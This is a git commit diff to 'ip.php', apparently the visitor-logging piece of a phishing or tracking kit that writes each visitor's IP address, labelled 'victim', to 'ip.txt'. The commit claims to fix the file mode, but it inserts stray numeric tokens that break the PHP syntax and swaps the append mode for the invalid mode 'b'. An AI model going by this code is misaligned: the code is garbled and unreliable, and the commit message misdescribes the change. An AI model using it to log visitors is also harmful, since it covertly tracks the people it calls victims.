9539ffe2dc7379a895519433732e5abd635a7866
eliasnew07-ctrl <eliasnew07@gmail.com>
2026-02-10 21:09:58 -0600

    Fix file mode in fopen for ip.txt

--- ip.php
+++ ip.php
@@ -1,6 +1,6 @@
 <?php
 
-if (!empty($_SERVER['HTTP_CLIENT_IP']))
+if (!empty($_SERVER['HTTP_CLIENT_IP']))[14650925010]
     {
       $ipaddress = $_SERVER['HTTP_CLIENT_IP']."\r\n";
     }
@@ -17,8 +17,8 @@ $browser = $_SERVER['HTTP_USER_AGENT'];
 
 
 $file = 'ip.txt';
-$victim = "IP: ";
-$fp = fopen($file, 'a');
+$victim = "IP: "; (14650925010)
+$fp = fopen($file, 'b');
 
 fwrite($fp, $victim);
 fwrite($fp, $ipaddress);
